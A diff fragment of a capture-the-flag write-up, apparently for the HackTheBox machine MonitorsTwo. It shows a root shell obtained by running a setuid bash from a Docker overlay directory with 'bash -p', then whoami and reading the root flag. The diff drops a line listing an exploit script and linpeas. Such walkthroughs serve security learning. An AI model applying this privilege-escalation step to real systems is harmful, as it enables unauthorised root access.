@@ -205,8 +205,6 @@ Then we run `bash -p` in the directory notified by the exploit and get the root 
 marcus@monitorstwo:~$ /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged/bin/bash -p
 bash-5.1# whoami
 root
-bash-5.1# ls
-exp.sh  linpeas_linux_amd64  user.txt
 bash-5.1# cat /root/root.txt 
 d5acf148181ca7850891559a2fec2c26
 ```
